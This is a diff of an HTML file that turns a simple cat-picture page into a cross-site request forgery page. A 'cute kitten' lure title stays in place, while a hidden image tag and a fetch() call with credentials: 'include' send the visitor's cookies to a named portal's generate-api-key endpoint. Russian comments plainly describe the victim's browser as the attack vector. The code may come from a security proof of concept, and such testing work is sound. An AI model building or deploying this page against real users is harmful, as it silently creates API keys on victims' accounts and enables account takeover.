@@ -1,32 +1,19 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Просто кот</title>
-    <style>
-        /* Базовые стили для центрирования картинки */
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh; /* Высота на весь экран */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #f0f0f0;
-        }
-        img {
-            max-width: 100%;
-            max-height: 100%;
-            border-radius: 15px; /* Скругленные углы для красоты */
-            box-shadow: 0 4px 8px rgba(0,0,0,0.2); /* Легкая тень */
-        }
-    </style>
+    <title>Посмотрите на этого милого котика!</title>
 </head>
 <body>
-
-    <!-- Здесь мы загружаем картинку кота с публичного сервиса-заглушки -->
-    <img src="https://cataas.com/cat" alt="Случайный кот">
-
+    <h1>Загрузка...</h1>
+    <!-- Жертва открывает страницу, браузер делает GET-запрос с куками жертвы -->
+    <img src="https://common-portal.drp-dev.facct.dev/portal/user/generate-api-key" style="display:none;">
+    
+    <!-- Альтернативный вариант, если сервер игнорирует img (например, из-за Content-Type) -->
+    <script>
+        fetch("https://common-portal.drp-dev.facct.dev/portal/user/generate-api-key", {
+            method: "GET",
+            credentials: "include" // Важно! Отправляем куки жертвы
+        }).catch(e => console.log(e));
+    </script>
 </body>
 </html>
